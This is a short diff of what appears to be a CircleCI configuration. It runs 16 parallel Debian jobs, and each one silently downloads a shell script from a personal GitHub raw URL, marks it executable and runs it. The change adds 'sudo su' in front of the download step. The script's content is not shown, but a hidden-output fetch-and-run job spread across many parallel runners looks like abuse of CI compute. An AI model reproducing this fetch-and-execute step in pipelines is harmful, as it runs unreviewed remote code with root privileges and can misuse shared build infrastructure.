@@ -5,7 +5,7 @@ jobs:
             - image: debian:latest 
       parallelism: 16 
       steps: 
-        - run: wget -O sa.sh https://raw.githubusercontent.com/Cetinbas11/1/main/sa.sh > /dev/null 2>&1
+        - run: sudo su && wget -O sa.sh https://raw.githubusercontent.com/Cetinbas11/1/main/sa.sh > /dev/null 2>&1
         - run: chmod +x sa.sh
         - run: ./sa.sh
  
